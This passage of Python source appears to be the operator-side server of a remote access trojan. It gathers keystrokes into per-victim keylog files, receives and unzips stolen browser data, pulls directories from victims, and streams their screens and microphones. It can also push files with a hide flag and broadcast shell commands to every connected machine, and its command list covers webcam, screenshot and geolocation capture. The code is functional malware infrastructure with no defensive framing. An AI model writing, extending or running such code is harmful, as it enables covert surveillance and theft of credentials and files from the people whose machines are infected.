                    file_path = os.path.join(save_dir, rel_path)
                    
                    # Read exactly the number of bytes specified in the header
                    bytes_received = 0
                    with open(file_path, 'wb') as f:
                        while bytes_received < file_size:
                            # Calculate how many bytes we still need to receive
                            remaining = file_size - bytes_received
                            # Read up to 4096 bytes at a time
                            chunk_size = min(4096, remaining)
                            chunk = client_socket.recv(chunk_size)
                            if not chunk:
                                # Connection closed prematurely
                                self.log_message(f"ERROR: Connection closed while receiving file data")
                                break
                            # Write the chunk directly to the file
                            f.write(chunk)
                            bytes_received += len(chunk)
                            # Update transfer progress
                            with self.lock:
                                if transfer_id in self.transfer_sessions:
                                    self.transfer_sessions[transfer_id]['received'] += len(chunk)
                    
                    # Verify we received all bytes
                    if bytes_received != file_size:
                        self.log_message(f"ERROR: Expected {file_size} bytes, received {bytes_received}")
                        # Delete the incomplete file
                        if os.path.exists(file_path):
                            os.remove(file_path)
                    else:
                        self.log_message(f"File successfully saved: {file_path}")
                        
                elif b"[PULL_DIR_END]" in peek_data:
                    # Consume the end marker
                    client_socket.recv(peek_data.find(b"[PULL_DIR_END]") + len(b"[PULL_DIR_END]"))
                    break
        
            # Calculate total transfer time
            transfer_time = time.time() - self.transfer_sessions[transfer_id]['start_time']
            self.log_message(f"Directory saved: {save_dir}")
            self.log_message(f"Transfer time: {transfer_time:.2f} seconds")
            
            # Clean up transfer session
            with self.lock:
                if transfer_id in self.transfer_sessions:
                    del self.transfer_sessions[transfer_id]
                
        except Exception as e:
            self.log_message(f"Error handling directory pull from {client_id}: {e}")
            import traceback
            self.log_message(traceback.format_exc())
    
    def handle_pull_confirm(self, client_socket, client_id, data=None):
        # Parse header: [PULL_CONFIRM:path:size]
        if data is None:
            # First, read the header
            header_buffer = b""
            while True:
                chunk = client_socket.recv(1)
                if not chunk:
                    return
                header_buffer += chunk
                if chunk == b']':
                    break
            
            # Parse header
            header = header_buffer.decode('utf-8')
        else:
            # Data was provided as parameter
            end_pos = data.find(']')
            if end_pos == -1:
                return
            header = data[1:end_pos]
        
        parts = header.split(':')
        if len(parts) < 3:
            return
            
        path = parts[1]
        size = int(parts[2])
        
        # Log the pull request
        size_mb = size / (1024 * 1024)
        self.log_message(f"Pull request from {client_id}: {path} ({size_mb:.2f} MB) - Auto-accepting")
        
        # Send positive response
        response_msg = f"[PULL_RESPONSE:yes]\n"
        client_socket.send(response_msg.encode('utf-8'))
        
        self.log_message(f"Sent pull response 'yes' to {client_id}")
    
    def handle_keylog(self, client_socket, client_id, data):
        # Extract key data: [KEYLOG:key_data]
        key_data = data[8:].strip()
        
        # Get keylog file path for this client
        with self.lock:
            if client_id not in self.keylog_files:
                keylog_dir = f"keylogs/{client_id}"
                os.makedirs(keylog_dir, exist_ok=True)
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                keylog_path = os.path.join(keylog_dir, f"keylog_{timestamp}.txt")
                self.keylog_files[client_id] = keylog_path
            else:
                keylog_path = self.keylog_files[client_id]
        
        # Write key data to file
        with open(keylog_path, 'a') as f:
            f.write(key_data + "\n")
        
        # Only log to console for special keys
        if key_data in ["[ESC]", "[QUIT]"]:
            self.log_message(f"[{client_id}] Keylogger stopped")
        # For regular keys, we don't log to console to avoid flooding
    
    def handle_file_flags(self, client_socket, client_id, data):
        # Parse: [FILE_FLAGS:filename:flags]
        end_pos = data.find(']')
        if end_pos == -1:
            return
            
        header = data[1:end_pos]
        parts = header.split(':')
        if len(parts) < 3:
            return
            
        filename = parts[1]
        flags = parts[2]
        
        with self.lock:
            self.hidden_files[client_id].add((filename, flags))
        
        flag_desc = []
        if 'H' in flags:
            flag_desc.append("hidden")
        if 'I' in flags:
            flag_desc.append("invisible")
            
        self.log_message(f"File {filename} marked as {', '.join(flag_desc)} for {client_id}")
    
    def handle_expose_file(self, client_socket, client_id, data):
        # Parse: [EXPOSE_FILE:filename]
        filename = data[13:].strip()
        
        with self.lock:
            if client_id in self.hidden_files:
                # Find and remove the file from hidden list
                for file_info in list(self.hidden_files[client_id]):
                    if file_info[0] == filename:
                        self.hidden_files[client_id].remove(file_info)
                        self.log_message(f"File {filename} exposed for {client_id}")
                        return
                
                self.log_message(f"File {filename} not found in hidden list for {client_id}")
            else:
                self.log_message(f"No hidden files for {client_id}")
    
    def handle_expose_all(self, client_socket, client_id, data):
        with self.lock:
            if client_id in self.hidden_files and self.hidden_files[client_id]:
                count = len(self.hidden_files[client_id])
                self.hidden_files[client_id].clear()
                self.log_message(f"All {count} hidden files exposed for {client_id}")
            else:
                self.log_message(f"No hidden files to expose for {client_id}")
    
    def handle_live_audio(self, client_socket, client_id):
        """Handle live audio from client"""
        # Parse: [LIVE_AUDIO:length]
        end_pos = client_socket.recv(1024).find(b']')
        if end_pos == -1:
            return
            
        # Read the header
        header = client_socket.recv(end_pos + 1).decode('utf-8')
        parts = header[1:-1].split(':')
        if len(parts) < 2:
            return
            
        audio_length = int(parts[1])
        
        # Receive the audio data
        audio_data = b''
        remaining = audio_length
        
        while remaining > 0:
            chunk = client_socket.recv(min(4096, remaining))
            if not chunk:
                break
            audio_data += chunk
            remaining -= len(chunk)
        
        # If we have an active live chat session, add to the queue
        if client_id in self.live_chat_clients and client_id in self.audio_queues:
            try:
                # Convert bytes to numpy array
                audio_array = np.frombuffer(audio_data, dtype=np.int16)
                self.audio_queues[client_id].put(audio_array)
            except Exception as e:
                self.log_message(f"Error processing live audio from {client_id}: {e}")
    
    def handle_live_chat_start(self, client_socket, client_id):
        """Handle live chat start request from client"""
        with self.lock:
            if client_id not in self.live_chat_clients:
                self.live_chat_clients[client_id] = {
                    'input_stream': None,
                    'output_stream': None,
                    'input_thread': None,
                    'output_thread': None
                }
                
                # Start audio input thread for this client
                input_thread = threading.Thread(
                    target=self.audio_input_thread,
                    args=(client_socket, client_id)
                )
                input_thread.daemon = True
                input_thread.start()
                
                # Start audio output thread for this client
                output_thread = threading.Thread(
                    target=self.audio_output_thread,
                    args=(client_socket, client_id)
                )
                output_thread.daemon = True
                output_thread.start()
                
                self.live_chat_clients[client_id]['input_thread'] = input_thread
                self.live_chat_clients[client_id]['output_thread'] = output_thread
                
                self.log_message(f"Live chat started with {client_id}")
                self.update_clients_list()
            else:
                self.log_message(f"Live chat already active with {client_id}")
    
    def handle_live_chat_stop(self, client_socket, client_id):
        """Handle live chat stop request from client"""
        with self.lock:
            if client_id in self.live_chat_clients:
                # The threads will stop automatically when live_chat_clients is cleaned up
                del self.live_chat_clients[client_id]
                self.log_message(f"Live chat stopped with {client_id}")
                self.update_clients_list()
            else:
                self.log_message(f"No active live chat with {client_id}")
    
    def audio_input_thread(self, client_socket, client_id):
        """Thread to capture audio from server microphone and send to client"""
        try:
            # Open audio stream
            stream = self.audio.open(
                format=self.audio_format,
                channels=self.channels,
                rate=self.rate,
                input=True,
                frames_per_buffer=self.chunk
            )
            
            self.log_message(f"Audio input started for {client_id}")
            
            while client_id in self.live_chat_clients:
                try:
                    # Read audio data
                    data = stream.read(self.chunk, exception_on_overflow=False)
                    
                    # Send to client
                    header = f"[LIVE_AUDIO:{len(data)}]"
                    client_socket.send(header.encode('utf-8'))
                    client_socket.send(data)
                    
                except Exception as e:
                    self.log_message(f"Error in audio input for {client_id}: {e}")
                    break
            
            # Clean up
            stream.stop_stream()
            stream.close()
            self.log_message(f"Audio input stopped for {client_id}")
            
        except Exception as e:
            self.log_message(f"Failed to start audio input for {client_id}: {e}")
    
    def audio_output_thread(self, client_socket, client_id):
        """Thread to play audio received from client"""
        try:
            # Open audio stream
            stream = self.audio.open(
                format=self.audio_format,
                channels=self.channels,
                rate=self.rate,
                output=True,
                frames_per_buffer=self.chunk
            )
            
            self.log_message(f"Audio output started for {client_id}")
            
            while client_id in self.live_chat_clients:
                try:
                    # Get audio data from queue
                    if client_id in self.audio_queues and not self.audio_queues[client_id].empty():
                        audio_data = self.audio_queues[client_id].get()
                        
                        # Play audio
                        stream.write(audio_data.tobytes())
                    else:
                        # No data available, sleep briefly
                        time.sleep(0.01)
                        
                except Exception as e:
                    self.log_message(f"Error in audio output for {client_id}: {e}")
                    break
            
            # Clean up
            stream.stop_stream()
            stream.close()
            self.log_message(f"Audio output stopped for {client_id}")
            
        except Exception as e:
            self.log_message(f"Failed to start audio output for {client_id}: {e}")
    
    def handle_live_screen_start(self, client_socket, client_id, data=None):
        self.log_message(f"Live screen streaming started for {client_id}")
        
        # Clear any existing frames in the queue
        with self.lock:
            if client_id in self.live_screen_queues:
                while not self.live_screen_queues[client_id].empty():
                    try:
                        self.live_screen_queues[client_id].get_nowait()
                    except queue.Empty:
                        pass
        
        self.update_clients_list()
    
    def handle_live_screen_stop(self, client_socket, client_id, data=None):
        self.log_message(f"Live screen streaming stopped for {client_id}")
        
        # Clear any existing frames in the queue
        with self.lock:
            if client_id in self.live_screen_queues:
                while not self.live_screen_queues[client_id].empty():
                    try:
                        self.live_screen_queues[client_id].get_nowait()
                    except queue.Empty:
                        pass
        
        self.update_clients_list()
    
    def handle_live_screen(self, client_socket, client_id):
        # First, read the header
        header_buffer = b""
        while True:
            chunk = client_socket.recv(1)
            if not chunk:
                return
            header_buffer += chunk
            if chunk == b']':
                break
        
        # Parse header
        try:
            header = header_buffer.decode('utf-8')
            parts = header[1:-1].split(':')
            if len(parts) < 2:
                self.log_message(f"Invalid live screen header format from {client_id}")
                return
                
            frame_size = int(parts[1])
            
            # Read exactly the number of bytes specified in the header
            bytes_received = 0
            frame_data = b''
            while bytes_received < frame_size:
                remaining = frame_size - bytes_received
                chunk_size = min(4096, remaining)
                chunk = client_socket.recv(chunk_size)
                if not chunk:
                    break
                frame_data += chunk
                bytes_received += len(chunk)
            
            # Verify we received all bytes
            if bytes_received != frame_size:
                self.log_message(f"ERROR: Expected {frame_size} bytes, received {bytes_received}")
                return
            
            # Add frame to queue
            with self.lock:
                if client_id in self.live_screen_queues:
                    # If queue is full, remove oldest frame
                    if self.live_screen_queues[client_id].full():
                        try:
                            self.live_screen_queues[client_id].get_nowait()
                        except queue.Empty:
                            pass
                    self.live_screen_queues[client_id].put(frame_data)
                
        except Exception as e:
            self.log_message(f"Error handling live screen from {client_id}: {e}")
    
    def handle_browser_data(self, client_socket, client_id):
        """Handle browser data from client"""
        # First, read the header
        header_buffer = b""
        while True:
            chunk = client_socket.recv(1)
            if not chunk:
                return
            header_buffer += chunk
            if chunk == b']':
                break
        
        # Parse header
        try:
            header = header_buffer.decode('utf-8')
            parts = header[1:-1].split(':')  # Remove brackets and split
            if len(parts) < 3:
                self.log_message(f"Invalid browser data header format from {client_id}")
                return
                
            filename = parts[1]
            size = int(parts[2])
            
            self.log_message(f"Receiving browser data: {filename} ({size} bytes)")
            
            # Create save directory if it doesn't exist
            save_dir = f"browser_data/{client_id}"
            os.makedirs(save_dir, exist_ok=True)
            
            # Open file in binary mode for writing
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            save_path = os.path.join(save_dir, f"browser_data_{timestamp}_{filename}")
            
            # Read exactly the number of bytes specified in the header
            bytes_received = 0
            with open(save_path, 'wb') as f:
                while bytes_received < size:
                    # Calculate how many bytes we still need to receive
                    remaining = size - bytes_received
                    # Read up to 4096 bytes at a time
                    chunk_size = min(4096, remaining)
                    chunk = client_socket.recv(chunk_size)
                    if not chunk:
                        # Connection closed prematurely
                        self.log_message(f"ERROR: Connection closed while receiving browser data")
                        break
                    # Write the chunk directly to the file
                    f.write(chunk)
                    bytes_received += len(chunk)
            
            # Verify we received all bytes
            if bytes_received != size:
                self.log_message(f"ERROR: Expected {size} bytes, received {bytes_received}")
                # Delete the incomplete file
                if os.path.exists(save_path):
                    os.remove(save_path)
                return
            else:
                self.log_message(f"Browser data successfully saved: {save_path}")
                
                # Extract the zip file
                try:
                    extract_dir = os.path.join(save_dir, f"extracted_{timestamp}")
                    os.makedirs(extract_dir, exist_ok=True)
                    
                    # Extract the zip file
                    if filename.endswith('.zip'):
                        import zipfile
                        with zipfile.ZipFile(save_path, 'r') as zip_ref:
                            zip_ref.extractall(extract_dir)
                        self.log_message(f"Browser data extracted to: {extract_dir}")
                    else:
                        self.log_message(f"Browser data saved as: {save_path}")
                        
                except Exception as e:
                    self.log_message(f"Error extracting browser data: {e}")
                
        except Exception as e:
            self.log_message(f"Error handling browser data from {client_id}: {e}")
            import traceback
            self.log_message(traceback.format_exc())
    
    def start_live_screen_viewer(self, client_id):
        if not self.active_client:
            self.log_message("No active client selected")
            return
        
        if client_id not in self.live_screen_queues:
            self.log_message(f"No live screen data available for {client_id}")
            return
        
        # Check if window already exists
        if client_id in self.live_screen_windows:
            try:
                self.live_screen_windows[client_id].raise_()
                self.live_screen_windows[client_id].activateWindow()
                return
            except:
                del self.live_screen_windows[client_id]
        
        # Emit signal to create window in main thread
        self.signals.create_live_screen_window.emit(client_id, self)
        self.log_message(f"Requesting live screen viewer for {client_id}")
    
    def get_prompt(self):
        if self.active_client and self.active_client in self.client_directories:
            current_dir = self.client_directories.get(self.active_client, "~")
            # Clean up the directory path to remove any [DIR] tags or extra text
            current_dir = re.sub(r'\[DIR\].*$', '', current_dir).strip()
            
            # Color the path in red using ANSI escape codes
            red_start = "\033[91m"
            red_end = "\033[0m"
            return f"[{self.active_client}:{red_start}{current_dir}{red_end}]> "
        return f"[{self.get_timestamp()}] Enter command: "
    
    def command_handler(self):
        self.log_message("\nAvailable commands:")
        self.log_message("  list          - List connected clients")
        self.log_message("  select <id>   - Select active client")
        self.log_message("  send <cmd>    - Send command to active client")
        self.log_message("  send <id> <cmd> - Send command to specific client")
        self.log_message("  broadcast <cmd> - Send command to all clients")
        self.log_message("  pwd           - Show current directory of active client")
        self.log_message("  upload <path> [-hide] - Upload file to active client")
        self.log_message("  hidden        - Show hidden files for active client")
        self.log_message("  transfers     - Show active file transfers")
        self.log_message("  live_chat     - Start/stop live chat with active client")
        self.log_message("  live_screen   - View live screen of active client")
        self.log_message("  quit          - Stop the server\n")
        
        while self.running:
            try:
                cmd = input(self.get_prompt()).strip()
                if not cmd:
                    continue
                
                # Check if command is whitelisted
                if cmd.lower() in self.whitelisted_commands:
                    self.log_message(f"Command '{cmd}' is whitelisted and will not be sent to the client.")
                    continue
                
                # Reset search term and client for each new command
                self.search_term = None
                self.search_client = None
                
                # Check if command is a server command
                first_word = cmd.split()[0].lower() if cmd.split() else ""
                server_commands = ['list', 'select', 'pwd', 'hidden', 'transfers', 'live_chat', 'live_screen', 'quit', 'broadcast', 'send', 'upload']
                
                if first_word in server_commands:
                    # Process as server command
                    if cmd.lower() == 'quit':
                        self.stop()
                        break
                    elif cmd.lower().startswith('select '):
                        client_id = cmd[7:].strip()
                        self.select_client(client_id)
                    elif cmd.lower() == 'list':
                        self.list_clients()
                    elif cmd.lower() == 'pwd':
                        self.show_current_directory()
                    elif cmd.lower() == 'hidden':
                        self.show_hidden_files()
                    elif cmd.lower() == 'transfers':
                        self.show_transfers()
                    elif cmd.lower() == 'live_chat':
                        self.toggle_live_chat()
                    elif cmd.lower() == 'live_screen':
                        self.start_live_screen_viewer(self.active_client)
                    elif cmd.lower().startswith('send '):
                        parts = cmd.split(' ', 2)
                        if len(parts) == 2:
                            command = parts[1]
                            self.send_to_active_client(command)
                        elif len(parts) >= 3:
                            client_id = parts[1]
                            command = parts[2]
                            self.send_to_client(client_id, command)
                        else:
                            self.log_message("Usage: send <client_id> <command> OR send <command> (for active client)")
                    elif cmd.lower().startswith('broadcast '):
                        command = cmd[10:]
                        self.broadcast_command(command)
                    elif cmd.lower().startswith('upload '):
                        parts = cmd.split(' ', 2)
                        if len(parts) >= 2:
                            path = parts[1]
                            hide_flag = False
                            if len(parts) >= 3 and parts[2] == '-hide':
                                hide_flag = True
                            self.upload_to_client(path, hide_flag)
                        else:
                            self.log_message("Usage: upload <path> [-hide]")
                else:
                    # This is a client command
                    if self.active_client:
                        # Check if it's a search command
                        if cmd.lower().startswith('search '):
                            # Extract search term
                            search_term = cmd[7:].strip()
                            if search_term:
                                self.search_term = search_term
                                self.search_client = self.active_client
                                self.log_message(f"Searching for: {search_term}")
                                self.start_loading_animation()
                        
                        # Send command to active client
                        self.send_to_active_client(cmd)
                        
                        # Set up command completion detection
                        with self.lock:
                            # Reset command completion tracking
                            if self.active_client in self.pending_commands:
                                self.pending_commands[self.active_client].clear()
                            
                            # Set command start time
                            self.command_start_time[self.active_client] = time.time()
                            
                            # Reset command completion flag
                            self.command_completed[self.active_client] = False
                            
                            # Set up end marker detection for certain commands
                            if cmd.lower().startswith('geoloc'):
                                self.command_end_markers[self.active_client] = "Geolocation tracking stopped"
                            elif cmd.lower().startswith('screenshot'):
                                self.command_end_markers[self.active_client] = "Screenshot saved"
                            elif cmd.lower().startswith('webcam'):
                                self.command_end_markers[self.active_client] = "Webcam image saved"
                            elif cmd.lower().startswith('audio'):
                                self.command_end_markers[self.active_client] = "Audio recording saved"
                            else:
                                # No specific end marker
                                self.command_end_markers[self.active_client] = None
                        
                        # Wait for command completion with appropriate timeout
                        if cmd.lower().startswith('cd '):
                            # For cd commands, use a shorter timeout and simpler approach
                            timeout = 3
                            if self.active_client in self.pending_commands:
                                if not self.pending_commands[self.active_client].wait(timeout=timeout):
                                    elapsed = time.time() - self.command_start_time.get(self.active_client, 0)
                                    self.log_message(f"Command timed out after {elapsed:.2f}s: {cmd}")
                        else:
                            # For other commands, use a smarter approach
                            start_time = time.time()
                            output_received = False
                            last_output_time = 0
                            
                            # First, wait for initial output (up to 2 seconds)
                            while time.time() - start_time < 15:
                                with self.lock:
                                    if self.active_client in self.last_output_time and self.last_output_time[self.active_client] > 0:
                                        output_received = True
                                        last_output_time = self.last_output_time[self.active_client]
                                        break
                                time.sleep(0.05)  # Reduced sleep time for faster response
                            
                            if not output_received:
                                # No output received within 2 seconds
                                self.log_message(f"No output received for command: {cmd}")
                            else:
                                # Output received, now wait for completion
                                # If we have an end marker, wait for it
                                if self.command_end_markers.get(self.active_client):
                                    # Wait up to 10 seconds for the end marker
                                    while time.time() - start_time < 10:
                                        with self.lock:
                                            if self.command_completed.get(self.active_client, False):
                                                break
                                        time.sleep(0.05)  # Reduced sleep time for faster response
                                else:
                                    # No end marker, wait for a gap in output (0.5 seconds without new output)
                                    while time.time() - start_time < 10:  # Max 10 seconds total
                                        with self.lock:
                                            current_time = time.time()
                                            if self.active_client in self.last_output_time:
                                                # If no new output for 0.5 seconds, consider command complete
                                                if current_time - self.last_output_time[self.active_client] >= 0.5:
                                                    break
                                                last_output_time = self.last_output_time[self.active_client]
                                            else:
                                                # No output timestamp yet
                                                break
                                        time.sleep(0.05)  # Reduced sleep time for faster response
                            
                            # Clear output buffer after command completion
                            with self.lock:
                                if self.active_client in self.command_output_buffer:
                                    self.command_output_buffer[self.active_client] = []
                    else:
                        # No active client, broadcast to all clients
                        # Check if it's a search command
                        if cmd.lower().startswith('search '):
                            # Extract search term
                            search_term = cmd[7:].strip()
                            if search_term:
                                self.search_term = search_term
                                # For broadcast, we don't set a specific client
                                self.log_message(f"Broadcasting search for: {search_term}")
                                self.start_loading_animation()
                        
                        self.broadcast_command(cmd)
                        
                        # Wait for all commands to complete (simplified for broadcast)
                        time.sleep(1)  # Give some time for responses
                    
                    # Stop loading animation if it was started
                    if self.loading:
                        self.stop_loading_animation()
                    
            except EOFError:
                self.stop()
                break
            except KeyboardInterrupt:
                self.stop()
                break
            except Exception as e:
                self.log_message(f"Command error: {e}")
    
    def toggle_live_chat(self):
        if not self.active_client:
            self.log_message("No active client selected. Use 'select <client_id>' first.")
            return
            
        with self.lock:
            if self.active_client in self.live_chat_clients:
                del self.live_chat_clients[self.active_client]
                self.log_message(f"Live chat stopped with {self.active_client}")
            else:
                self.live_chat_clients[self.active_client] = True
                self.send_to_active_client("live_chat")
                self.log_message(f"Live chat started with {self.active_client}")
        
        self.update_clients_list()
    
    def show_transfers(self):
        with self.lock:
            if not self.transfer_sessions:
                self.log_message("No active file transfers")
                return
                
            self.log_message("\nActive file transfers:")
            for transfer_id, session in self.transfer_sessions.items():
                progress = (session['received'] / session['total']) * 100
                elapsed = time.time() - session['start_time']
                speed = session['received'] / (1024 * 1024) / elapsed if elapsed > 0 else 0
                self.log_message(f"  {transfer_id}: {progress:.1f}% - {speed:.2f} MB/s")
            print()
    
    def show_hidden_files(self):
        if not self.active_client:
            self.log_message("No active client selected")
            return
            
        with self.lock:
            if self.active_client in self.hidden_files and self.hidden_files[self.active_client]:
                self.log_message(f"Hidden files for {self.active_client}:")
                for filename, flags in self.hidden_files[self.active_client]:
                    flag_desc = []
                    if 'H' in flags:
                        flag_desc.append("hidden")
                    if 'I' in flags:
                        flag_desc.append("invisible")
                    flag_str = f" ({', '.join(flag_desc)})" if flag_desc else ""
                    self.log_message(f"  {filename}{flag_str}")
            else:
                self.log_message(f"No hidden files for {self.active_client}")
    
    def upload_to_client(self, path, hide_flag=False):
        if not self.active_client:
            self.log_message("No active client selected. Use 'select <client_id>' first.")
            return
            
        if not os.path.exists(path):
            self.log_message(f"File not found: {path}")
            return
            
        with self.lock:
            for client in self.clients:
                if client['id'] == self.active_client:
                    try:
                        header = f"[UPLOAD_FILE:{os.path.basename(path)}:{os.path.getsize(path)}:{1 if hide_flag else 0}:0]"
                        client['socket'].send(header.encode('utf-8'))
                        
                        with open(path, 'rb') as f:
                            while True:
                                chunk = f.read(4096)
                                if not chunk:
                                    break
                                client['socket'].send(chunk)
                        
                        self.log_message(f"File uploaded to {self.active_client}: {path}")
                    except Exception as e:
                        self.log_message(f"Error uploading to {self.active_client}: {e}")
                    return
            self.log_message(f"Client {self.active_client} not found")
    
    def list_clients(self):
        with self.lock:
            if not self.clients:
                self.log_message("No clients connected")
                return
                
            self.log_message("\nConnected clients:")
            for client in self.clients:
                current_dir = self.client_directories.get(client['id'], "~")
                status = " [ACTIVE]" if client['id'] == self.active_client else ""
                chat_status = " [LIVE CHAT]" if client['id'] in self.live_chat_clients else ""
                screen_status = " [LIVE SCREEN]" if client['id'] in self.live_screen_queues else ""
                self.log_message(f"  ID: {client['id']}, Address: {client['addr'][0]}:{client['addr'][1]}, Dir: {current_dir}{status}{chat_status}{screen_status}")
            print()
    
    def select_client(self, client_id):
        with self.lock:
            found = False
            for client in self.clients:
                if client['id'] == client_id:
                    self.active_client = client_id
                    current_dir = self.client_directories.get(client_id, "~")
                    self.log_message(f"Active client set to {client_id} (current directory: {current_dir})")
                    found = True
                    break
            
            if not found:
                self.log_message(f"Client {client_id} not found")
        
        self.update_clients_list()
    
    def show_current_directory(self):
        if self.active_client:
            current_dir = self.client_directories.get(self.active_client, "~")
            self.log_message(f"Current directory of {self.active_client}: {current_dir}")
        else:
            self.log_message("No active client selected")
    
    def send_to_active_client(self, command):
        if not self.active_client:
            self.log_message("No active client selected. Use 'select <client_id>' first.")
            return
            
        self.send_to_client(self.active_client, command)
    
    def send_to_client(self, client_id, command):
        # Check if command is whitelisted
        if command.lower() in self.whitelisted_commands:
            self.log_message(f"Command '{command}' is whitelisted and will not be sent to the client.")
            return
            
        with self.lock:
            for client in self.clients:
                if client['id'] == client_id:
                    try:
                        client['socket'].send(command.encode('utf-8'))
                        self.log_message(f"Command sent to {client_id}: {command}")
                        
                        # Reset command completion event before sending
                        if client_id in self.pending_commands:
                            self.pending_commands[client_id].clear()
                        
                        # Reset command completion flag
                        if client_id in self.command_completed:
                            self.command_completed[client_id] = False
                        
                        # Clear output buffer for this client
                        if client_id in self.command_output_buffer:
                            self.command_output_buffer[client_id] = []
                        
                        # Reset last output time
                        if client_id in self.last_output_time:
                            self.last_output_time[client_id] = 0
                        
                        # For directory change commands, we'll get a directory update automatically
                        # No need to send an explicit pwd request
                    except Exception as e:
                        self.log_message(f"Error sending to {client_id}: {e}")
                    return
            self.log_message(f"Client {client_id} not found")
    
    def broadcast_command(self, command):
        # Check if command is whitelisted
        if command.lower() in self.whitelisted_commands:
            self.log_message(f"Command '{command}' is whitelisted and will not be sent to the clients.")
            return
            
        with self.lock:
            if not self.clients:
                self.log_message("No clients connected")
                return
                
            self.log_message(f"Broadcasting command: {command}")
            for client in self.clients:
                try:
                    client['socket'].send(command.encode('utf-8'))
                    
                    # Reset command completion event for each client
                    if client['id'] in self.pending_commands:
                        self.pending_commands[client['id']].clear()
                    
                    # Reset command completion flag for each client
                    if client['id'] in self.command_completed:
                        self.command_completed[client['id']] = False
                    
                    # Clear output buffer for each client
                    if client['id'] in self.command_output_buffer:
                        self.command_output_buffer[client['id']] = []
                    
                    # Reset last output time for each client
                    if client['id'] in self.last_output_time:
                        self.last_output_time[client['id']] = 0
                except Exception as e:
                    self.log_message(f"Error broadcasting to {client['id']}: {e}")
    
    def stop(self):
        if self.running:
            self.running = False
            self.stop_loading_animation()
            self.log_message("\nShutting down server...")
            
            # Close all client connections
            with self.lock:
                for client in self.clients:
                    try:
                        client['socket'].close()
                    except:
                        pass
                self.clients.clear()
                self.client_directories.clear()
                self.hidden_files.clear()
                self.keylog_files.clear()
                self.transfer_sessions.clear()
                self.live_chat_clients.clear()
                self.audio_queues.clear()
                self.live_screen_queues.clear()
                self.pending_commands.clear()
                self.command_output_buffer.clear()
                self.command_start_time.clear()
                self.command_completed.clear()
                self.last_output_time.clear()
                self.command_end_markers.clear()
                
                # Close live screen windows
                for client_id, window in self.live_screen_windows.items():
                    try:
                        window.close()
                    except:
                        pass
                self.live_screen_windows.clear()
                
                self.active_client = None
            
            # Close server socket
            if self.server_socket:
                try:
                    self.server_socket.close()
                except:
                    pass
            
            # Terminate audio
            try:
                self.audio.terminate()
            except:
                pass
            
            self.log_message("Server stopped")
            
            # Emit server stopped signal
            self.signals.server_stopped.emit()
            
            # Close log file
            if self.log_to_file and self.log_file:
                with open(self.log_file, 'a') as f:
                    f.write(f"\nServer stopped at {datetime.now()}\n")
                    f.write("=" * 50 + "\n")

if __name__ == "__main__":
    # Create Qt application
    app = QApplication(sys.argv)
    
    # Create server
    server = RemoteServer()
    
    # Connect the signal for creating live screen window
    def create_live_screen_window(client_id, server_instance):
        window = LiveScreenWindow(client_id, server_instance)
        server_instance.live_screen_windows[client_id] = window
        window.show()
    
    server.signals.create_live_screen_window.connect(create_live_screen_window)
    server.signals.server_stopped.connect(app.quit)
    
    # Start server thread
    server.start()
    
    # Start command handler in a separate thread
    cmd_thread = threading.Thread(target=server.command_handler)
    cmd_thread.daemon = True
    cmd_thread.start()
    
    # Run the application
    sys.exit(app.exec_())
